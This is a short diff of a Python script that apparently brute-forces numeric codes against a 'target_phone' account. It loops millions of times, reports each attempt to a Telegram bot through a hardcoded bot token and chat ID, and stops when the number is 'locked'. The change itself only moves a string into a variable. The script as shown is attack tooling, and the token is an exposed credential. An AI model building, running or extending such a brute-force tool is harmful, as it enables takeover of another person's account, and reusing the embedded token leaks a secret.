@@ -6,6 +6,7 @@ TOKEN = "9252397028:AAE4kzmZYeIKJuWVdeRiy7Ai5KocsT4xWro"
 CHAT_ID = 6263683593
 url2 = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
 target_phone = "772490746"
+aa ="محظور "
 for i in range(9999999):
     time.sleep(0.2)
     zee = 4456190
@@ -21,7 +22,7 @@ for i in range(9999999):
     
     d = {
     "chat_id": CHAT_ID,
-    "text": zee +i  ," tt": "محظور" 
+    "text": zee +i  ," tt": aa 
     
 }
     if response.status_code == 200:
@@ -31,7 +32,8 @@ for i in range(9999999):
      
      #شرط اذا الرقم محظور توقف
     elif "locked" in text_lower:
-        rr = requests.post(url2, data=d, timeout=10)
+        r = requests.post(url2, data=d, timeout=10)
+        
         print("الرقم محضور")
         break
         
